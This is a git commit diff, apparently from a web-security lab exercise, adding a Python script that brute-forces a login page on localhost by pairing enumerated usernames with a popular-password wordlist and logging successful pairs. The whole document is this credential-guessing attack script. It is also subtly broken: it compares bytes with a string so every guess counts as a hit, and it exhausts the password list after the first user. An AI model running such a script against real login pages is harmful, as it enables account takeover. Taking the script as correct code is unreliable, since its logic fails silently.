c540b28c68aeb8c0d2444794765e6d2809c5e59e
root <root>
2020-11-16 14:14:17 -0500

    Second task 1 try

--- default_pass.py
+++ default_pass.py
@@ -1,1 +1,19 @@
-print ('kek')
+import requests
+
+
+def user_enum(login, passw):
+    payload = {'login': login, 'password': passw}
+    response = requests.get('http://localhost/user-enum/login.php', params=payload)
+    return response.content != 'Wrong Password!'
+
+
+val_name = open('output_lists/logins', 'r')
+passwords = open('input_lists/Most-Popular-Letter-Passes.txt', 'r')
+fw = open('output_lists/logins_and_pass', 'w')
+for name in val_name:
+    for password in passwords:
+        if user_enum(name, password):
+            fw.write(name + ' ' + password)
+val_name.close()
+passwords.close()
+fw.close()
